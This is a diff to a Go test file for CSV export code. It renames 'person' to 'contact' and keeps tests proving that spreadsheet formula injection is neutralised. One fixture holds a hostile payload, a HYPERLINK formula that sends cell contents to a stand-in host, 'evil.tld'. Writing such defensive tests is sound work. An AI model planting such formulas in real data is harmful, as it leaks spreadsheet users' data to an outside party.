@@ -6,7 +6,7 @@ package compose
 // A CSV export is opened in a spreadsheet, which auto-evaluates any cell that
 // begins with a formula lead (= + - @ TAB CR). A stored text value like
 // `=HYPERLINK(...)` — plantable unauthenticated through the public booking
-// form onto a person's name — must therefore leave the export as literal text,
+// form onto a contact's name — must therefore leave the export as literal text,
 // never a live formula. Both CSV writers (the full bundle and the filtered
 // export) render every cell through csvCell, so the guard is proven at that
 // choke point and again through the filtered-export render path a client hits.
@@ -61,11 +61,11 @@ func TestCSVCellDefusesSpreadsheetFormulas(t *testing.T) {
 
 func TestFilteredExportCSVDefusesFormulaInjection(t *testing.T) {
 	// The exact render path the filtered-export handler calls (renderExport):
-	// a person named `=HYPERLINK(...)` exported to CSV must round-trip through
+	// a contact named `=HYPERLINK(...)` exported to CSV must round-trip through
 	// a spreadsheet importer as the neutralized literal, not the bare formula.
 	payload := `=HYPERLINK("https://evil.tld/x?d="&A1&B1,"click")`
 	data := memberData{
-		table:   "person",
+		table:   "contact",
 		columns: []string{"full_name"},
 		rows:    [][]any{{payload}},
 	}
